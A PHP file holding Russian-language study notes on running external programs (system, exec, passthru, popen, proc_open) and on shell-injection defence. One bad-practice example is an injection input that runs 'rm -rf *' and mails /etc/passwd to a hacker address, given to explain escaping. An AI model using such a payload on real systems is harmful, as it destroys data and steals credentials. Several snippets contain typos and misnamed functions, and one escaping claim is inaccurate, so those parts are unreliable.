<?php 

/*
			Запуск внешней программы (Выводит результат в выхоной поток - браузер, что ограничивает ее применение)
			return_var хранит код возврата процесса (Передавай переменную, а не const)
			Чтобы избежать выхоного потока в браузер следует воспользоватьься функциями popen() и exec()
			Если нужно, чтобы данные попали в браузер и никак не исказились следует исп  passthru ()

			!!! Всегда нужно обробатываать запрос, т.к эта команда может легко натворить бед
			string system(string $comand [,int &$return_var])
			
			Возвращает последнюю выхоную строку из выходного потока и ничего не выводит в раузер
			Если задан  $array, он заполняется списком строк, которые печатаются прогой  в выхожно йпоток (символы \n отсекаются)
			Если массив содержал данные до этого, то он ДОЗАПОЛНЯЕТСЯ, но не переписывается
			Дожидается как и sysem завершения процесса, потом передает управление PHP
			string exec(string $command [, list& $array] [, int& $return_var]) 
			
			Запускает процесс и выводит весь вывод направляет в браузер польователя 
			(К примеру, для генерации изображжений на лету)
			string passthru(string $command [, int& $return_var])
			
			Пример:
			header("Content-type: image/jpeg"); // Сообщаем браузеру, что данные юудут jpeg
			passthru("./convert -blur 3 input.jpg -");  // Запускаем утилиту размытия изображения на 3 пикселя (-) Говорит о то, что инфа пойдет в стандартный выходной поток, который ф-ция перенаправит в браузер (предполагается, что convert в текущем каталоге)

//--- Обратные апострафы для запуска внешних программ (Обратные, которые ряжом с 1(`))
			$string= `dir`; 
			echo $string; // В WIN dir - распечатка текущего каталога

//---	Защита
			 escapeshellond () // Предварение все спец сиволов обратными слешами
			 Применение:
			 system("cd ".escapeshellcmd($toDirectory) ); // Защищаем от атак
					 Плохой пример:
					 system("cd $toDirectory"); 
					 // Введем : ~; rm -rf *; sendmail hacker@domain.com </etc/passwd  
					 // Хакер получит файл с пользователями и паролями в UNIX Системе
			 		НО если 
			 		system("cd ".escapeshellcmd($toDirectory) ); // cd \-\; rm -rf \*\; sendmail hacker@domain.com \</etc/passwd 
					// Сиволы окончания строки (;) экранируются

				// Плозой приме выше лучше использовать с жтой командой
				string eacapeshellarg(string $command) // добавляет слеши тольо для ($, `, \)
*/

/*			КАНАЛЫ
			
			Допустим, нужно нужно запустить из сценария внешнюю программу (утилиту sendmail).
			Нужен механизм передачи...

			1) Через аременные файлы (плохо)
					Создадим временный файл, отправим майл, ссыаясь на этот файл. (Плохая производительность)
					$tmp = tempnam (". ", '"'); 
					file_put_contents(Stmp, "What do you think I am? Human?"); 
					system ( "commandToExecute < $tmp"); 
					unlink ( $tmp); 
				Лучше использовать межпроцессорные каналы

			2) Межпроцессорные каналы
					
					Открытие Канала ( программа cmd, открывает канал либо по входному ("w"), лиюо по выходному потоку("r"))
					resource popen(string $cmd, string $mode) 

					Допустим, по каким-то причинам стандартные функции отправки PHP отказали (такое бывает)
					Отправка самого себя по почте утилитой sendmail, а не mail
					
					<?php
						//Запустим процесс параллельно работе сценария
							$fp = popen("/usr/sbin/sendmail -t -i", "wb"); 
						
						// Передаем процессу тело письма в стондартный Входной поток
							fwrite($fp, "From: our script <script@mail.ru>\n"); 
							fwrite($fp, "To: someuser@mail.ru\n"); 
							fwrite($fp, "Subject: here is myself\n");
							fwrite($fp, "\n");
							fwrite($fp, file_get_contents(_FILE_));

						// Закрываем канал
							pclose ($fp)
				
					?>

					/ Принцип работы:
						Запускаем прогу  по адресу popen, НЕ дожидаемся завершения(как system), а сразу 
						идем на след строку (Второй параметр - чтение/запись как в fopen())
						Далее:
						Стандартный фход утилиты sendmail (по умолч обыная клава ) прикрепляется к  идентиф $fp
						Теперь все, что печатет скрипт (у нас тело писььма и заголовки) попоадает во входн поток sendmail
						И может быть прочитано внутри нее с пмощью вызовов файловых ф-ций стения консоли

						Закрываем утилиту, это говрит о том, что ввод закончен

					/ 
				
				Стоит отметить, что popen не может позволить делать одновресенное чтение и запись.
				ЭрАБОТАТЬ ОДНОВРЕМЕННО С ВХОдным и выходным потоком позволяет функция
				
				Ф-ция запускает cmd и выдает вхожной и выходной потоки (аккуратно, может произойти взаимная блокировка deadlock
				resource proc_open(string $cmd, array $spec, array &$pipes) 

				Пример взаимной блокировки:
				<?php
					header("Content-type: text/plain"); 
					//Информация о стандартных потоках
					$spec = [
										0 => ["pipe", "r"], // stdin 
										1 => ["pipe", "w"], // stdout 
										2 => ["file", "/tmp/error-output.txt", "a"] // stderr 
									];
					$proc = proc_open("cat", $spec, $pipes);

					Дальше можно писать в $pipes[0] и читать из $pipes[1]

					for ($i = 0; $i < 100; $i++) fwrite($pipes[O], "Hello World #$i!\n"); 
					fclose($pipes[0)); 

					while (!feof($pipes[l))) echo fgets($pipes[l], 1024); 
					fclose($pipes[l]);

					//Закрываем дескриптор
					proc_close($proc); 
				?>

				!!! Проблема deadlock:
						Допустим утилита считывает данные и тут же перенаправляет их в свой выхожной поток:
						Когда мы записываем данные в pipes[0], то данные уходят в pipes[1], гду они накапливаются в буфере
						Размер буфера не безграничен (обычно 10 Кбайт). Как тольок он заполнится, фнкция войдет в 
						в состояние сна (записи) и будет ожидать пока кто-то не считает даннные с буфера, освободив место
						
						Получается: Утилита ждет, пока данные считают, а скрипт, пока утилита будет способна принять инфу,
						которую он ей передает. Т.е 2 Программы ждут друг друга. (если увеличить в пред примере 100 на 1000, можно проверть)
				ВЫВОД:
						При исп proc_open() слудет записывать и считывать данные небольшими партиями и ередавать ЗАПИСЬ/ЧТЕНИЕ
						+ Закрывай потоки так рано, как это возможно fclose()
				!!!

				При запуске proc_open() без параметров утилита будет работать в фоновом реиме, закрыть ее можно так:
				proc_terminate(); 

				Для уменьшения ресурсов потребления можно сменить приоритет:
				proc_nice();


*/


?>